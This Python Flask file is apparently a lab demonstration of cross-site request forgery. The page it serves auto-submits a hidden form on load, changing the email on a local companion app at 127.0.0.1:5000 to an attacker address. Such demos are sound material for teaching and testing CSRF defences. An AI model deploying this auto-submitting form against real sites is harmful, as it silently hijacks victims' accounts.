from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string("""
    <h1>Flask App 2 (Malicious)</h1>
    <p>Click the button!</p>
    <form action="http://127.0.0.1:5000/change-email" method="post" id="csrf-form">
        <input type="hidden" name="new-email" value="attacker@example.com">
    </form>
    <script>
        // Automatically submit the form when the page loads
        document.getElementById('csrf-form').submit();
    </script>
    """)

if __name__ == '__main__':
    app.run(port=5001)
